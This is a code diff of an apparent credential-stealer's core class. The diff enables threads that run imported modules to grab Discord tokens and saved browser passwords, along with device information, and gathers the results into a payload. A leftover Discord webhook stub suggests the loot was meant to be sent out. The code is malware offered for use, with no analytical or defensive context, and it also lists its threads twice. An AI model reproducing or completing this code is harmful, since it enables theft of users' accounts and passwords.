@@ -1,9 +1,8 @@
-# import threading
+import threading
 import json
 from urllib.request import Request, urlopen
-# from modules.discord_token import DiscordToken
-# from browser_grabber import run as run_browser
-
+from modules.discord_token import DiscordToken
+from modules.password_browser import Browser
 
 class Core:
     def __init__(self):
@@ -12,36 +11,24 @@ class Core:
         self.payload = []
         self.Threadlist = []
         self.infoDevice = []
-
     
     def main(self):
-        print('Teste')
-        self.getInfoDevice()
-        
-        # t1 = threading.Thread(target=run_discord)
-        # t2 = threading.Thread(target=run_browser)
-        # t3 = threading.Thread(target=self.getInfoDevice())
+        t1 = threading.Thread(target=self.run_discord_token)
+        t2 = threading.Thread(target=self.run_browser)
+        t3 = threading.Thread(target=self.getInfoDevice)
 
-        # t1.start()
-        # t2.start()
+        t1.start()
+        t2.start()
+        t3.start()
 
-        # self.Threadlist.append(t1)
-        # self.Threadlist.append(t2)
+        self.Threadlist.append(t1)
+        self.Threadlist.append(t2)
+        self.Threadlist.append(t3)
 
-        # for t in self.Threadlist:
-        #     t.join()
-        # for patt in discordPaths:
-        #     a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
-        #     a.start()
-        #     Threadlist.append(a)
-        # threads.append(threading.Thread(target=run_discord))
-        # threads.append(threading.Thread(target=run_browser))
-            
-        #         for t in threads:
-        #     t.start()
+        self.Threadlist.extend([t1, t2, t3])
 
-        # for t in threads:
-        #     t.join()
+        for t in self.Threadlist:
+            t.join()
         
     def getInfoDevice(self):
         try:
@@ -66,9 +53,16 @@ class Core:
         except:
             return
     
+    def run_discord_token(self):
+        dt = DiscordToken()
+        self.payload.append({'discord': dt})
+
+    def run_browser(self):
+        br = Browser()
+        self.payload.append({'browser': br})
     
-    def discordWebhook(self, token):
-        print(1)
+    # def discordWebhook(self, token):
+    #     print(1)
     
 if __name__ == "__main__":
     Core()
